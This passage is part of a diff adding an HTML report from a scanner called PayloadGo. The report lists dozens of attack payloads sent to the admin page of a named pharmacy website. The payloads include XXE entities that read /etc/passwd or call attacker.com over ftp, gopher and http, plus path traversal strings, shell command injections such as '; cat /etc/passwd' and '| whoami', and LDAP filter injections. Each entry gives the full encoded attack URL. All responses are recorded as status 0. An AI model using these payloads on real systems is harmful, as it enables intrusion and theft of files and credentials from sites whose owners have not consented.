+                    <p><strong>💻 Payload:</strong> <span class="payload">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#34;file:///proc/version&#34;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fproc%2Fversion%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#34;ftp://attacker.com/steal&#34;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+%22ftp%3A%2F%2Fattacker.com%2Fsteal%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#34;gopher://attacker.com/steal&#34;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+%22gopher%3A%2F%2Fattacker.com%2Fsteal%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#34;http://attacker.com/steal&#34;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+%22http%3A%2F%2Fattacker.com%2Fsteal%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#34;php://filter/read=convert.base64-encode/resource=/etc/passwd&#34;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3D%2Fetc%2Fpasswd%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#34;jar:file:///etc/passwd&#34;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+%22jar%3Afile%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">..\..\..\windows\system32\drivers\etc\hosts</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &#34;file:///etc/hosts&#34;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fhosts%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">../etc/passwd</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=..%2Fetc%2Fpasswd</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">....//....//....//etc/passwd</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=..%25c1%259c..%25c1%259c..%25c1%259cetc%25c1%259cpasswd</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">/etc/passwd%00</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%2Fetc%2Fpasswd%2500</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">..\..\..\..\..\..\..\..\..\..\etc\passwd</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cetc%5Cpasswd</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">..%c0%af..%c0%af..%c0%afetc%c0%afpasswd</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=..%25c0%25af..%25c0%25af..%25c0%25afetc%25c0%25afpasswd</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">..%252F..%252F..%252Fetc%252Fpasswd</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=..%25252F..%25252F..%25252Fetc%25252Fpasswd</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">..%2F..%2F..%2Fetc%2Fpasswd</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=..%252F..%252F..%252Fetc%252Fpasswd</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">/etc/passwd%00.txt</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%2Fetc%2Fpasswd%2500.txt</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">..\..\..\..\..\..\..\..\..\..\windows\system32\drivers\etc\hosts</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">; ls -la</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%3B+ls+-la</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">| ls -la</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%7C+ls+-la</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">` ls -la `</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%60+ls+-la+%60</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&amp; ls -la</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%26+ls+-la</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&amp; cat /etc/passwd</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%26+cat+%2Fetc%2Fpasswd</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">; cat /etc/passwd</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%3B+cat+%2Fetc%2Fpasswd</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">$( ls -la )</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%24%28+ls+-la+%29</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">$( cat /etc/passwd )</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%24%28+cat+%2Fetc%2Fpasswd+%29</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">` cat /etc/passwd `</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%60+cat+%2Fetc%2Fpasswd+%60</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">; whoami</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%3B+whoami</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">| cat /etc/passwd</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%7C+cat+%2Fetc%2Fpasswd</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">| whoami</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%7C+whoami</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">` whoami `</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%60+whoami+%60</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&amp; whoami</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%26+whoami</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">; id</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%3B+id</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">$( whoami )</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%24%28+whoami+%29</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">| id</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%7C+id</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&amp; id</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%26+id</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">` id `</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%60+id+%60</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">$( id )</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%24%28+id+%29</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">; uname -a</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%3B+uname+-a</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">| uname -a</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%7C+uname+-a</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">&amp; uname -a</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%26+uname+-a</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">*)(&amp;</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%2A%29%28%26</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">` uname -a `</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%60+uname+-a+%60</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">*</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%2A</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">$( uname -a )</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%24%28+uname+-a+%29</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">*)(|(objectClass=*</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%2A%29%28%7C%28objectClass%3D%2A</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">*)(|</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%2A%29%28%7C</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">*)(|(objectClass=user</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%2A%29%28%7C%28objectClass%3Duser</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">*)(|(cn=*</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%2A%29%28%7C%28cn%3D%2A</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">*)(|(objectClass=group</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%2A%29%28%7C%28objectClass%3Dgroup</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">*)(|(uid=*</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%2A%29%28%7C%28uid%3D%2A</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">*)(|(sAMAccountName=*</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%2A%29%28%7C%28sAMAccountName%3D%2A</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">*)(|(objectCategory=*</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%2A%29%28%7C%28objectCategory%3D%2A</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">*)(|(member=*</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%2A%29%28%7C%28member%3D%2A</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">*)(|(memberOf=*</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%2A%29%28%7C%28memberOf%3D%2A</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">*)(|(objectSid=*</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%2A%29%28%7C%28objectSid%3D%2A</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">*)(|(objectGUID=*</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%2A%29%28%7C%28objectGUID%3D%2A</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+                <div class="vulnerability">
+                    <p><strong>💻 Payload:</strong> <span class="payload">*)(|(mail=*</span></p>
+                    <p><strong>🌐 URL:</strong> <span class="url">https://kpharmacyllc.com/admin.html?test=%2A%29%28%7C%28mail%3D%2A</span></p>
+                    <p><strong>📊 Status:</strong> 0 | <strong>⏱️ Time:</strong> 0ms</p>
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p> Generated by PayloadGo - Professional Vulnerability Testing Tool</p>
+            <p>For security professionals and bug bounty hunters</p>
+        </div>
+    </div>
+</body>
+</html>
